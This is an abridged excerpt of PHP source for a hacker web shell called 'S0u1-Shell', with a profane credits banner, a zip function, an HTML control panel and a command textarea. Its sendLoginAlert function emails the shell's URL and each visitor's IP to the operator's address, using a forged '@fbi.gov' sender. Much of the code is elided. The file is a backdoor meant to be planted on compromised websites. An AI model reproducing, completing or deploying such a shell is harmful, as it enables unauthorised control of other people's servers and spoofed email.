...
[]========================================
[]>>>>>>>> coded by S0u1, FazRul<<<<<<<<<<
[]========================================
[]+  Fucking Swag at its finest          +
[]+  Fucking butt fuck the system        +
[]========================================
S0u1izGod FazrulizGod
*/
...
function Zip($source, $destination) // Thanks fazrul didnt get thus part
{
...
$ownerEmail 		= "Pawned@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
...
function sendLoginAlert()
{
    ...
    $from = "SuckDic$randomInt@fbi.gov"; 
    
    //echo $from;
    
    if(function_exists('mail'))
    {
        $subject = "Shell Accessed -- S0u1-Shell --";
        $message = "
Hey Owner ,
        
        Your Shell(S0u1-Shell) located at $url was accessed by $accesedIp
...
<html>
<head>
<title>Lets take Time 4 Lulz</title>
...
<table class="top">
    <tbody>
        <tr>
            <td width="300px;">
            <div class="logo">
                <img src="https://tse2.mm.bing.net/th?id=OIP.emxfjjUT9JsQg-LhiZ_oiAEsBL&pid=15.1&P=0&w=405&h=102" />
            </div>
            </td>
            <td>
            <div class="header">
    ...
    else
    {
        ...
        <form method="GET">
            ...
            <table id="margins">
                ...
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">S0u1s Shell  Rocks!!</textarea>
                    </td>
                </tr>
...
<p align="center"><b>(C) Copyright S0u1 [All rights reserved]</b><br />
(: <a href="https://www.facebook.com/HLoTW/">Follow Me</a> | <a href="http://www.facebook.com/HLoTW/">Facebook</a> :) <br />
\m/ <b>Greetz to</b> : S0u1, Fazrul Team :D \m/<br />
